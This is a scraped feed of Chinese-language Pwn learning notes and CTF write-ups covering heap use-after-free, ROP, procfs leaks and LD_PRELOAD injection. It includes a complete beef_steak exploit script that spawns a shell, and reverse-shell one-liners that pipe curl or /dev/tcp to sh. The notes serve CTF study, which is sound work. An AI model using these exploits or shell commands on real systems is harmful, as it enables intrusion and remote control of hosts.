0x09cec1a0 → 0x0804865b → &lt;print_note_content+0&gt; push ebp$ecx : 0x09cec010 → 0x00020000$edx : 0x09cec160 → 0x00000000$esp : 0xffca8fb0 → 0x00000008$ebp : 0xffca8fe8 → 0xffca9008 → 0x00000000$esi : 0xf7f21000 → 0x001d7d6c (&quot;l&#125;&quot;?)$edi : 0x0 $eip : 0x08048761 → &lt;add_note+235&gt; add esp, 0x10$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffca8fb0│+0x0000: 0x00000008 ← $esp0xffca8fb4│+0x0004: 0xffca8fd4 → 0x00000a38 (&quot;8&quot;?)0xffca8fb8│+0x0008: 0x000000080xffca8fbc│+0x000c: 0xf7d77b50 → &lt;atoi+16&gt; add esp, 0x1c0xffca8fc0│+0x0010: 0xffca8ff8 → 0xffca0a31 → 0x000000000xffca8fc4│+0x0014: 0x000000000xffca8fc8│+0x0018: 0x0000000a0xffca8fcc│+0x001c: 0x00000002─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048752 &lt;add_note+220&gt; mov al, ds:0x458b0804 0x8048757 &lt;add_note+225&gt; call 0x581173df 0x804875c &lt;add_note+230&gt; call 0x80484e0 &lt;malloc@plt&gt; → 0x8048761 &lt;add_note+235&gt; add esp, 0x10 我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。 123gef➤ x&#x2F;2wx 0x09cec1600x9cec160: 0x00000000 0x09cec170gef➤ 覆盖后，具体的值如下（这里其实我测试的时候跳多了，直接结束了，重新跑的时候地址变了，所以0x0846210a这个地方是错的，但前面被修改为magic地址是可以确定的 1234gef➤ x&#x2F;2wx 0x09cec1600x09cec160: 0x08048986 0x0846210agef➤ x&#x2F;i 0x08048986 0x8048986 &lt;magic&gt;: push ebp 可以看出，确实已经被覆盖为我们所想要的 magic 函数了。 最后执行的效果如下 123456789101112131415$ python exp.py [+] Starting local process './hacknote': pid 20575[*] running in new terminal: /usr/bin/gdb -q \"./hacknote\" 20575 -x \"/tmp/pwnHjxz2s.gdb\"[+] Waiting for debugger: Done[*] Switching to interactive modeTHIS_IS_A_FLAG---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ----------------------Your choice :$ 同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下 1234567891011121314151617181920212223242526272829303132gef➤ heap-analysis-helper [*] This feature is under development, expect bugs and unstability...[+] Tracking malloc()[+] Tracking free()[+] Tracking realloc()[+] Disabling hardware watchpoints (this may increase the latency)[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.[*] Note: The heap analysis slows down noticeably the execution. gef➤ cContinuing.[+] Heap-Analysis - malloc(8)&#x3D;0x804b008[+] Heap-Analysis - malloc(8)&#x3D;0x804b008[+] Heap-Analysis - malloc(32)&#x3D;0x804b018[+] Heap-Analysis - malloc(8)&#x3D;0x804b040[+] Heap-Analysis - malloc(32)&#x3D;0x804b050[+] Heap-Analysis - free(0x804b018)[+] Heap-Analysis - watching 0x804b018[+] Heap-Analysis - free(0x804b008)[+] Heap-Analysis - watching 0x804b008[+] Heap-Analysis - free(0x804b050)[+] Heap-Analysis - watching 0x804b050[+] Heap-Analysis - free(0x804b040)[+] Heap-Analysis - watching 0x804b040[+] Heap-Analysis - malloc(8)&#x3D;0x804b040[+] Heap-Analysis - malloc(8)&#x3D;0x804b008[+] Heap-Analysis - Cleaning up[+] Heap-Analysis - Re-enabling hardware watchpoints[New process 36248]process 36248 is executing new program: &#x2F;bin&#x2F;dash[New process 36249]process 36249 is executing new program: &#x2F;bin&#x2F;cat[Inferior 3 (process 36249) exited normally] 这里第一个输出了两次，应该是 gef 工具的问题。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CodeGate 2014 – rev+pwn450 – weird_snus","slug":"CodeGate-2014-–-rev-pwn450-–-weird-snus","date":"2019-07-05T07:12:28.000Z","updated":"2019-07-05T07:13:14.086Z","comments":true,"path":"2019/07/05/CodeGate-2014-–-rev-pwn450-–-weird-snus/","link":"","permalink":"https://darkwing.moe/2019/07/05/CodeGate-2014-%E2%80%93-rev-pwn450-%E2%80%93-weird-snus/","excerpt":"","text":"题目信息题目链接https://github.com/ctfs/write-ups-2014/tree/master/codegate-preliminary-2014/weirdsnus 准备环境12$ echo HEHE_I_DONT_KNOW_YOU &gt; admin_passwd $ echo N0_MoR3_SMOKING_SNUS &gt; flag 基本信息 静态分析x86二进制文件分析使用IDA 重命名变量 stack上的变量，全局变量等，考虑他们在哪里被使用 确定变量的size 特别是char[]类型的数组 确定结构体的结构 IDA中可以定义结构体成员 猜测函数功能 根据变量名，变量size，结构体结构等，可能看出函数功能 重命名函数 根据函数的功能重命名函数 发现处理不当(错误)的地方 找出可能利用点 重复以上流程，找出漏洞点，分析编写exploit main整体大概是这样 从函数定义，函数实现，参数传递，canary相关等进行分析 复杂的处理可以从library call为起点确定变量 因为library call有固定的参数个数和参数类型 第一块 保存旧的ebp，在stack frame上更新当前的ebp，准备好函数使用的各种寄存器的值，准备好stack空间，做好各种准备，以便函数启动后能立即就绪 将函数参数(这里是argv)保存到stack上。x86中通常将参数重新保存在栈上 从TLS区域(gs+0x14)将stack canary复制到栈上 以上三个是常见模式 buffer是0x110-0x10=0x100=256字节 memset的内部展开，”rep stosd”四个字节是memset高速实现 stosd: EAX存储在[EDI]中 rep: ecx!=0时[重复ecx-=N(这里是DWORD，N=4)] strlen是library call，需要注意signed和unsigned的区别 第2到5快 图上已经做了函数重命名（分析后的结果） 函数结束时，释放使用的stack，还原用到的寄存器，还原ebp的值。如果函数有返回值，则返回值给eax 转换成C语言代码大概是这样： password_check第一块 第二块～ 转换成C语言代码 memcmp的第三个参数len，是用户可控的 输入\\x00的话，len(“\\x00”)=0 这样就跳过了memcmp doit第一块 第三～块 EAX范围检查按照unsigned，如果不在0x28~0x7a则nop 第七～块 switch 保存在.rodata区域的jump_table 分支分析大概是这样 如果argv[1]有’(‘, ‘)’，则可以调用更深的函数，但需要先bypass前面的认证 转换成C语言代码 实际上signed比较函数也有bug，一般size比较都是signed，如果输入一个字节的负数(0x80~0xff)，能够通过比较。但是没法进行后续利用 case ‘z’那里的free(ptr)之后没有清空ptr，后续进行写入会造成Use After Free，但是这里也无法进行exploit do_command_loop 可以看到一个malloc(16)的结构体 结构体大概这样，定义后应用 根据需要应用结构体偏移 分析之后大概是这样 转换成C语言代码 do_command_loop的bug 存在两个bug 第一个bug，read_key(new_buffer, buffer_len)，两个参数完全没关系，但是read_key内部将buffer_len作为new_buffer的size，buffer_len用户可控 第二个bug，free(ptr)之后，没有将ptr设置为NULL，也就能够进行Use After Free ptr != NULL的检查不能确定UAF。也就是说，如果UAF之后ptr用作其他用途，则可能修改func_ptr，之后可能调用func_ptr。 漏洞思考 如何控制EIP 重写函数指针 我们已经有一个16字节的结构体： 1234struct struc_1 &#123;char string[12]void* func_ptr # 想要重写这个&#125; 首先构造Use After Free do_A - malloc do_M - free free时，因为是16字节，会连接到fastbins区域 LIFO，下次申请16字节内存时会重新使用这部分内存 寻找一个16字节分配以及任意写入的点 这里会根据我们指定的size进行malloc，之后read_key用到new_buffer getcwd()通过new_buffer读取当前工作目录，如果当亲工作目录path超过16字节，就能够覆盖函数指针 利用流程大概是这样： 动态调试 测试运行 已经控制了EIP getshell因为有NX，shellcode比较困难，尝试system(“/bin/sh”) 常规方式需要将参数加载到stack上 第一个参数必定是0x0a，不能指定文件名 Use After Free这是可能的利用方式 func_ptr overwrite + ROP 先在stack上准备好ROP 通过Use After Free，在func_ptr之前，pop×N; ret 这样当调用该函数时，popxN除去了多余的参数，执行ROP command使用fgets()读取输入到buffer 因此可以考虑在换行前输入字符串 但是这种方法只能读取10个字节 而这种ROP需要至少12个字节 注意到do_D的buffer可以控制 考虑使用command D 尝试 计算偏移 需要一个add esp, 0x144+α的gadget 找到一个add 0x140 + pop3回 = 0x14c的gadget exploit大概流程是这样： 替换为system, /bin/sh的地址 img 可以看到测试能够getshell 实际运行 img img 发生了SIGSEGV 实际上成功了 system(“/bin/sh”)，command从标准输入读取 但是，标准输入绑定input，因此无法读取到 因此，不执行任何操作，/bin/sh结束 之后因为stack已经被破坏，发生SIGSEGV 我们需要做一点处理 img (cat input; cat -) 这样能够向input继续输入 成功getshell","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记22:Use After Free","slug":"Pwn学习笔记22-Use-After-Free","date":"2019-06-25T08:04:07.000Z","updated":"2019-06-25T08:05:01.906Z","comments":true,"path":"2019/06/25/Pwn学习笔记22-Use-After-Free/","link":"","permalink":"https://darkwing.moe/2019/06/25/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B022-Use-After-Free/","excerpt":"","text":"前置知识之前有过相关内容 Use After Free 模式化fastbins类型典型流程 找到存在Use After Free漏洞的指针x free(x)，但没有将x设置为NULL 如果有多个指针，free(x)之后没有将所有的指针设置为NULL x最好是函数指针 或者后面的y是一个函数指针 free(x) # 但x仍然指向堆中的一个chunk 发送会产生free(x)的输入选项 之后直接y = malloc(size)，返回与x相同的chunk 如果能够指定size，只需要与x的size相同就可以 攻击者必须能够向y写入内容 向y写入内容(相当于写x) 如果能够使用x就会造成Use After Free 可以将func_ptr修改为任意值 Use After Free后的利用方式一般是劫持函数指针 调用 system(“/bin/sh”) 需要能够将输入数据作为函数参数 类似system(“/bin/sh”)进行ROP/COP/JOP等 类似system(“/bin/sh”)调用进行ROP/COP/JOP的stager 无法直接指定函数参数，也可以用ppret这种方式执行stack上的ROP heap上也经常使用的JOP/COP 其他的利用方式x，y不是func_ptr的情况 控制作为字符串使用的成员 消除NULL终止符，泄漏堆和libc(arena相关)的地址 控制作为字符串指针的成员 任意内存的内存泄漏 替换GOT之类的地址 控制作为权限flag的成员 意外的权限提升 控制作为count，size之类的成员 stack/heap 溢出 控制作为链表指针的成员 重新连接时可能任意地址写 Unlink attack, fastbins unlink attack","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记21:其他一些技术","slug":"Pwn学习笔记21-其他一些技术","date":"2019-06-24T06:00:34.000Z","updated":"2019-06-24T06:02:34.173Z","comments":true,"path":"2019/06/24/Pwn学习笔记21-其他一些技术/","link":"","permalink":"https://darkwing.moe/2019/06/24/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B021-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/","excerpt":"","text":"回连后禁用SIGALRM在具有alarm(x)的二进制文件上，进行exploit 假设已经反弹了shell 能够得到远程shell，但几秒后就会断开连接 如果能够快速输入’bash -i’的话当然很好 没有确认细节，通过bash禁用SIGALRM(使连接继续保持) 设置EAX的值通过ROP能够修改EAX/RAX为任意值的情况 直接调用system call 通过一些gadget结合EAX/RAX使用 但pop eax(rax)是很罕见的gadget 可以通过函数返回值来控制 alarm(x) -&gt; alarm(0) write(fd, buf, x) read(fd, buf, x) 某些情况下，能够将X设置为固定值 如果想让rax=11，可以调用write(stdout, buf, size=11) 但是，我们无法控制对应size参数的寄存器rdx 在存在write(stdout, buf, size=12)这类情况下，可以使用 存在使这个write的返回值为11的方法 但是，仅适用于本地权限提升类型，并且不需要读取输出的题目 考虑write(stdout, buf, size) 通常，stdout是阻塞模式 也就是说，write()在写入size大小之前不会结束 如果stdout处于非阻塞模式呢？ 即便没有全部写，也可以返回，返回值小于等于size 也就是说，需要将write setblocking(0) setblocking(0)的socket stdout 终端1 ： 使用python的socket bind() localhost:1337 作为服务器，即便有连接也不读取数据 终端2: 使用python的socket s去connect() localhost:1337 执行s.setblocking(0)，将socket设置为非阻塞模式 利用subprocess ： p=Popen(“./binary”, stdin=PIPE, stdout=s) 使用stdout和我们的socket s来进行ROP 调用write(stdout, …)，将一直写入，直到socket缓冲区被填满 write()因为非阻塞模式结束 write()的返回值将小于size(例如11) 不使用socket，使用同样buffer的pipe？ 这可能不行，因为返回errno: EAGAIN 仅在socket指定fd，并且提前发送大量数据的情况下才有效 CodeGate 2014 - minibomb __free_hookglibc的malloc()和free()的实现，在.bss中存在函数指针 http://osxr.org/glibc/source/malloc/malloc.c#2913 如果__free_hook不为NULL，则调用它而不是free。__free_hook是bss中的函数指针 假设存在任意的Write-primitive也就是，任意值可以写入任意内存的情况 重写__free_hook 当调用free的时候，控制RIP heap类问题下，重写__free_hook非常有用 例如将__free_hook修改为system() free(user_input)就变成了system(user_input) __free_hook是glibc内部变量，所以它不受Full-RELRO影响 类似的hook函数还有__malloc_hook等 CodeGate 2015 - weff WildCopy线程之间的条件竞争 http://googleprojectzero.blogspot.jp/2015/03/taming-wild-copy-parallel-thread.html 利用整数溢出，memcpy和上下文切换的特性 实现线程的二进制文件中可能有这种情况 对于基于线程的二进制文件，最好注意条件竞争 似乎也可用于沙盒问题 充分利用两个线程 线程A上执行memcpy(dst, src, 负数) 参数使用负数，利用整数溢出 因为memcpy将第三个参数看作unsigned，因此它会变成一个非常大的数 线程A保持从src到dst的memcpy 当dst到达不可访问的dst时会造成SIGSEGV 线程B使用被覆盖的内存 期待在线程A产生SIGSEGV之前发生上下文切换 线程B通过使用被覆盖的内存，控制栈或者堆函数指针来执行execve 调用execve时，所有线程都会停止，并且新进程会重置内存空间，因此不会产生SIGSEGV 栈保护页(Stack guard page)之外Linux中创建线程的几种方式 pthread系 pthread_create()之类 标准的创建线程函数 ucontext系 makecontext(),swapcontext(),getcontext(),setcontext() 自己实现线程切换计时时使用 还与sigaction()有关 clone系 创建线程的低层方式 clone(2)的flag参数，设置为CLONE_THREAD 每个线程都是独立的栈 pthread系自动创建栈，但可以单独调整 ucontext系和clone系需要自己创建一个新的栈空间（例如通过mmap） 线程(pthread系)中，栈是单独创建的 每个栈之间都有一个保护页(权限是—p) 但是，在地址上是连续的 线程B的栈 线程A的栈 原本的栈 如果一个线程用尽栈空间，会发生什么？ 在线程A中，考虑函数递归调用的情况 栈可能会堆积很多 最终，当尝试写入保护页时，发生SIGSEGV 因为权限是---p，不能读写 默认情况下，保护页的大小只有0x1000 如果线程A的递归函数越界超过0x1000呢？ 会跳过保护页，并且写入到线程B的栈中 线程B的栈被重写 线程A的递归调用可能重写线程B栈上的返回地址 之后，可以在线程B上进行ROP，getshell ucontext没有保护页 因为是自己准备栈空间(除非刻意生成保护页) 如果各个栈的内存地址是连续的，则不需要考虑跳过保护页，只需要溢出到其他线程的栈 例题 Hack.lu CTF 2014 - Mario (pthread系) Ghost in the shellcode 2015 - gitschat (ucontext系) 其他通过return-to-dl-resolve伪造link_map dl_runtime_resolve()，参数(栈上push的两个值)是link_map和reloc_arg 技术解释是伪造reloc_arg，可以伪造link_map产生同样的效果 HITCON CTF 2015 - blinkroot 针对Strict Weak Ordering的攻击 针对sort()函数 大多数情况下，第三个参数是作为排序规则的比较函数 比较函数必须满足严格弱排序(Strict Weak Ordering) 比较相同数值时，返回false，不改变顺序 通常，二进制文件运行期间无法生成和指定比较函数，也不存在可以动态生成和指定(Lua或者JavaScript)比较函数的例子 如果可以指定特殊比较函数(例如始终返回true)，那么sort可能会产生异常行为 这是一种针对未定义行为的攻击 通常sort内部实现是qsort，如果最初返回N次true，之后正常返回true/false的话，那么可能能够控制特定位置的内存交换 31C3 CTF 2014 - SaaS","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记20:其他一些技术","slug":"Pwn学习笔记20-其他一些技术","date":"2019-06-20T07:16:45.000Z","updated":"2019-06-20T07:17:41.266Z","comments":true,"path":"2019/06/20/Pwn学习笔记20-其他一些技术/","link":"","permalink":"https://darkwing.moe/2019/06/20/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B020-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/","excerpt":"","text":"本地权限提升下的ASLR 这类问题在getshell后有方法可以禁用ASLR http://inaz2.hatenablog.com/entry/2014/07/23/001318 ulimit -s unlimited (仅限32位进程) 这种方式可以启动一个禁用ASLR的bash会话 setarch uname -m -R /bin/bash(32位，64位都可以) 但是对于setuid的二进制程序无效 这样是一个固定的随机地址 利用procfs /proc/self/maps ： 可以知道内存映射(无视ASLR) 可以获得运行中进程的完整路径以及libc路径 /proc/self/stat ： 可以知道进程的准确栈地址 不如maps，但可以获得大量信息 /proc默认权限是可读的 信息宝库 因为它太强了，某些题目会修改它的权限 /proc/self/environ ： 可以获得进程的环境变量 /proc/self/mounts ： 可以获得mount信息 /proc/self/cmdline ： 可以获得进程启动时的命令行参数 可以通过/proc/$PPID/cmdline获得其他进程的信息 可以从/proc/self/stat获得$PPID 父进程的启动参数中也会有有用信息 检查这些内容可能获得突破 /proc/self/mem ： 可以重写自身内存，即使是.text 部分CTF沙盒题目会用到 /proc/self/fd/N ： 即使文件名未知也可以指定，只要它是打开的 /proc/self/fdinfo/N ： 可以确定文件的当前搜索(seek)位置 /proc/$PID/root ： 可以引用另一个namespace中运行的进程 /proc/$PID/cwd ： 同样，可能引用cwd /proc/$PID/mountinfo ： 同样，可能获取mount信息 可写目录任何人都可以写的目录 /tmp /var/tmp 如果设置了SBIT /var/metrics /var/crash /run/shm /run/lock 利用字符串”sh\\0”执行ROP时，最终需要执行system(“/bin/sh”) x86: p32(libc_system) + p32(dummy) + p32(&amp;”/bin/sh”) x64: p64(pop_rdi) + p64(&amp;”/bin/sh”) + p64(libc_system) 第一个参数需要字符串”/bin/sh” 一般是在libc中 因此，通常需要这些步骤： 确定libc版本 泄漏libc相关地址 libc_base + offset_binsh = libc_binsh 但是，system()需要通过PATH来搜索执行 因此，如果PATH没有被删除，甚至可以直接system(“sh”) 通常，”/bin”的PATH会保留 如果存在”sh\\0”这样的字符串，就可以利用 http://akiym.hateblo.jp/entry/2015/07/12/192517 在地址固定区域(例如.data)使用字符串”sh\\0” fflush, slash, hash之类的都可以 gdb-peda$ find 0x006873 可以利用的不仅仅是libc libpthread也是CTF常用的库 当使用多线程时，经常用到的库 这是少数具有system()和’sh’的库之一 还有其他库也有这些，但并不常用 https://www.youtube.com/watch?v=td1KEUhlSuk 11:00~左右，这个视频中没有使用’sh’，只使用了system() Python的interactive涉及Python二进制文件的漏洞利用案例 这种情况下，某些情况不需要突破ASLR 假设我们已经控制了RIP 我们可以尝试跳转到python shell 运行此shell的函数是PyRun_InteractiveLoop 通过溢出或者重写函数指针跳转到PyRun_InteractiveLoop 启动Python交互shell Python二进制文件没有PIE，这个函数地址是固定的 因为不涉及glibc，所以也不需要system(不需要考虑绕过ASLR) 但是需要注意，有必要获取目标环境的Python二进制文件来确定地址偏移等信息 某些情况，即使成功也会产生SIGSEGV 获取python shell之后，就可以直接调用os.system() php，perl，ruby等都有类似的函数 但是，能否无参数(无条件)启用交互式shell，不确定 例题 ：31C3 CTF 2014 - sarge 获取shell的短字符串system(任意字符串) 假设参数字符串的长度受限 可以尝试使用最短的字符串 xinetd类型 fd固定为0，1，2，只需要使用’sh’(包含空字符共3个字节)就可以 fork-server类型 ‘sh&lt;&amp;4’(6个字节)之类的(如果socket fd为4) 打开shell后，使用’bash -i &gt;&amp;4 2&gt;&amp;4’获得更多输出 SECUINSIDE 2014 - givemeshell 如果fd关闭 只能反弹shell bash: ‘sh&lt;/dev/tcp/111.222.333.444/80’(最大31字节) 回连之后，使用’bash -i &gt;&amp;0 2&gt;&amp;0’获取输出 netcat: ‘nc -e/bin/sh 111.222.333.444 80’(最大32字节) 更好的选择是’curl 111.222.333.444|sh’(最大24字节) 自己开启服务，返回想要执行的代码 将获取的响应传递给sh 获取反弹shell 可以使用较短的域名 例题：32C3 CTF 2015 - cryptmsg 如果能够上传文件 上传反弹shell的代码 默认情况下，没有执行权限，需要将它作为sh的参数 ‘sh /tmp/x’之类的，只需要10个字节 也可以使用通配符以及表示source的点 例如&#39;. /*/J*&#39;，只需要8个字节 无论文件名多长，这种方式都能使其足够短 通配符选择找到的第一个 因此最好使文件名比较独特 例题：Hack.lu CTF 2015 - Petition Builder 回连之后获取tty的方法 如果想要执行su，sudo，或者其他需要tty的命令 可以在stage2时关闭no-tty的fd 有四种方法 1. 使用Python python -c ‘import pty; pty.spawn(“/bin/sh”)’ 2. 使用expect ./expect -c ‘spawn sh; interact’ 需要自己上传expect及依赖库 3. 使用socat https://wiki.mma.club.uec.ac.jp/ytoku/CTF/Writeup/AdventCalendarCTF2014/2014-12-24 上传socat及依赖库 本地端：socat `tty`,raw,echo=0 TCP-L:80,reuseaddr 远程端：./socat TCP:&lt;ipaddr&gt;:80 exec:bash,pty,stderr,setsid 4. 使用script SHELL=/bin/bash script -q /dev/null 同样，php，perl，ruby之类的也可以 adctf - RegExp Quiz CodeGate 2015 - Rodent (stage2)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"beef_steak – CodeGate 2015 - pwnables400 ","slug":"beef-steak-–-CodeGate-2015-pwnables400","date":"2019-06-18T07:57:54.000Z","updated":"2019-06-18T07:58:43.417Z","comments":true,"path":"2019/06/18/beef-steak-–-CodeGate-2015-pwnables400/","link":"","permalink":"https://darkwing.moe/2019/06/18/beef-steak-%E2%80%93-CodeGate-2015-pwnables400/","excerpt":"","text":"基本信息Category: Pwnable Points: 400 Solves: TODO Description: Binary : http://binary.grayhash.com/6c5c199232567d00314a684d0123b11c/steak Server : 54.64.101.236 Port : TCP 8888 OS : Ubuntu 14.04.2 LTS x86-64 Just overflow. 有一个栈溢出，非常短的二进制文件 开了Stack Canary和NX 如何解决主要是三个点 argv[0] leak RC4 Shared Library Injection 初始检查直接运行会产生SIGSEGV，似乎缺少能够让它正常运行的东西 用strace确认添加env -i以防万一和清除环境变量 可以看出需要一个steak用户目录以及flag文件 创建对应用户及文件 123sudo adduser steaksu steakecho THIS_IS_A_FLAG &gt; /home/steak/flag 之后测试运行，大概就是接收stdin，sleep，结束，这样的流程 vmmap 低位是.text .data .bss等区域，这部分地址是固定的 高位是library，mapped，vdso，stack之类，程序正常运行必要的东西。如果开启了ASLR，这部分地址会受到影响。gdb运行下ASLR会暂时失效。 beef_steak解析静态分析 整个流程大概就是，从flag文件读取内容作为key，对stdin内容进行RC4加密，之后与特定内容进行比较，相等则执行system(&quot;/bin/cat &gt; ./message&quot;);，不相等puts(&quot;I don&#39;t like that!&quot;); RC4的key是flag key最大可能有40字节，理论上无法破解 因为我们不知道key，所以无法通过特定字符串的比较 也就无法调用system 存在栈溢出 缓冲区是40字节 读取了512字节 但是存在canary 这个问题符合argv[0] leak情况 Stack Canary 没有PIE canary保护的函数有足够的溢出空间 可以读取glibc显示的错误信息 那应该泄漏哪些东西呢？ 如果能够泄漏RC4相关内容就太棒了 如果成功，就能够调用system() 那么RC4相关内容在哪里 key(=flag)和表S，存在于.bss区域中 但是，key最初被KSA使用后立即清零。也就谁说，只有表S可以泄漏 表S的地址是0x602160 泄漏RC4内部表使用argv[0] leak泄漏0x602160的内容 尝试计算出准确距离，精确泄漏 在返回之前设置断点，查看状态 这里设置在0x400CC8，返回之前必定会执行这里 正常运行，确认stack状态： 可以计算出输入与argv[0]之间距离为280字节 使用280个”\\0” + 0x602160比较好 使用”\\0”而不是”A”，因为RC4_PRGA()中使用了strlen()，这样导致返回0，输入的数据不会经过RC4加密 因为没有进入循环，没有任何字节被修改，S也不会变化 注意小端序问题，测试运行： 实际上，这些就是泄漏出来的表S内容 exploitargv[0] leak 因为RC4状态表会出现一次\\x00导致后面内容不显示，所以需要进行一点处理 这样我们可以获取到本地测试环境的RC4状态表 RC4解密我们已经获得了状态表S，通过S生成伪随机数序列，与密文异或就能够获得明文 这样我们使用获取的明文作为输入，运行程序，就能够执行system() getshell这样我们相当于已经可以写入任意内容到文件了，应该也就能够进行Shared Library Injection 可以按这个流程操作： 第一次将mylib.so作为message上传 第二次伪造LD_PRELOAD=./message环境变量 到envp的距离 也就是说，我们如果想修改envp[0]，只需要填充296字节 那么字符串LD_PRELOAD=./message应该放在哪呢 因为RC4的输入是栈上的buffer，输出是全局变量output，全局变量的地址固定，可以使用这个 需要注意最初25个字节是strcmp进行比较来判断是否执行system 整个攻击流程大概是这样： exploit 参考https://m.blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220642760094&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F 只搜到这一篇writeup，结合以上内容直接看代码吧： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *def rc4_dec(_data): data = map(ord, _data) state = gstate[::] buf = [] var1 = 0 var2 = 0 for i in range(0, len(data)): var2 += 1 var2 %= 256 var1 += state[var2] var1 %= 256 tmp = state[var1] state[var1] = state[var2] state[var2] = tmp d = data[i] ^ state[(state[var1] + state[var2]) % 256] buf.append(d) return ''.join(map(chr, buf))r = remote(\"localhost\", 8888)_state = \"86041335c74693fcc63ba41192558dfd81eb63d45a17512e8c3ebf6fd162df4030a13fa38b5e140582859737c36d5321fec4cf1aba26873161cae9589a8341c172020164f41b60e20369b68a1eaa4eefe5f8da996c43a54d5da6ac908f3c91f638abfbcdbde05f2a70237d7c591dfacb0680d22d3a49209eb78466334c2750967adbb1a79429f1e6d0579fd90a489c9507540bafe7e4d839a94ff3e1b82f74109df073777e71097925b5281f89ea520c98add7c516f5180f19b388321c4b08f95cd3b00e5bb967342cde6e00eecec0dca845a03dff7675f215edecccc87f4744b465689bf7e856b2dde32bc936d64a122442d5bb0d78bc6b6abe7baea2c28e22\".decode(\"hex\")gstate = map(ord, _state)enc = \"\\x62\\x31\\xaa\\x85\\xbd\\xbf\\x9f\\xf3\\x8a\\x02\\x0c\\x75\\xac\\x23\\xab\\xe4\\x82\\xc5\\x25\\x7a\\xef\\xbd\\xc9\\x61\"print r.recv(1024)r.send(rc4_dec(enc) + \"\\n\") # b33fb33feasytodigestb33fprint r.recvuntil(\"You may leave a message\")lib = \"\"\"#include &lt;unistd.h&gt;__attribute__((constructor)) void init() &#123; char *f[] = &#123;\"/bin/bash\", NULL&#125;; execve(\"/bin/bash\", f, NULL);&#125;\"\"\"open(\"lib.c\", \"w\").write(lib)os.system(\"gcc -shared -fPIC -o lib.so lib.c\")r.send(open(\"lib.so\").read())r.close()r = remote(\"localhost\", 8888)print r.recv(1024)payload = rc4_dec(enc + \"\\x00\" * 8 + \"LD_PRELOAD=./message\\x00\")# there is no NULL Byte in payload, but there is in encrypted payloadpayload += \"\\x00\" * (0x128 - (len(payload)))payload += p64(0x602140)payload += \"\\x00\" * (512 - len(payload))r.send(payload)sleep(4.1)r.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Shared Library Injection","slug":"Shared-Library-Injection","date":"2019-06-12T07:13:20.000Z","updated":"2019-06-12T07:14:18.877Z","comments":true,"path":"2019/06/12/Shared-Library-Injection/","link":"","permalink":"https://darkwing.moe/2019/06/12/Shared-Library-Injection/","excerpt":"","text":"Shared Library Injection关注环境变量LD_PRELOAD LD_PRELOAD这个对于CTF选手来说应该很常见 例如这样使用 hook libc中的函数(例如printf)，将其替换成自定义函数 $ export LD_PRELOAD=./mylib.so $ ./a.out mylib.so中重写了printf()函数，a.out调用printf时，实际调用的是重写后函数 LD_PRELOAD环境变量的细节文档 http://linuxjm.osdn.jp/html/LDP_man-pages/man8/ld.so.8.html https://ctf-wiki.github.io/ctf-wiki/reverse/linux/ld_preload/ 正常情况下, Linux 动态加载器ld-linux(见 man 手册 ld-linux(8)) 会搜寻并装载程序所需的共享链接库文件, 而LD_PRELOAD是一个可选的环境变量, 包含一个或多个指向共享链接库文件的路径. 加载器会先于 C 语言运行库之前载入LD_PRELOAD指定的共享链接库，也就是所谓的预装载 (preload)。 预装载意味着会它的函数会比其他库文件中的同名函数先于调用, 也就使得库函数可以被阻截或替换掉. 多个共享链接库文件的路径可以用冒号或空格进行区分. 显然不会受到LD_PRELOAD影响的也就只有那些静态链接的程序了. 当然为避免用于恶意攻击, 在ruid != euid的情况下加载器是不会使用LD_PRELOAD进行预装载的. 更多阅读: https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4 就是一个能够重新加载函数的环境变量，但是如果设置了suid/sgid的话就不可用 思路 